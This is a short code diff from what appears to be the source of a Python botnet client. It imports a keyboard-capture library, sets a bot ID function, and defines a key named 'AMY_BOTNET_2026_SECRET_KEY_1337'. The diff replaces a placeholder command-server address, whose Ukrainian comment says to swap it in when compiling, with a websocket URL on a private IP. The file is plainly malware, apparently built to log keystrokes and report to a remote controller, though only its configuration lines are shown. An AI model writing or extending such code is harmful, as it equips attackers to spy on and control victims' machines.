@@ -22,7 +22,7 @@ from pynput import keyboard
 from io import BytesIO
 
 # ====================== CONFIGURATION ======================
-SERVER_URL = "ws://ВАШ_IP_VPS:8000/ws/" # ЗАМІНІТЬ ПРИ КОМПІЛЯЦІЇ
+SERVER_URL = "ws://192.168.10.82:8000/ws/" # ЗАМІНІТЬ ПРИ КОМПІЛЯЦІЇ
 KEY = b"AMY_BOTNET_2026_SECRET_KEY_1337"
 
 def get_bot_id():
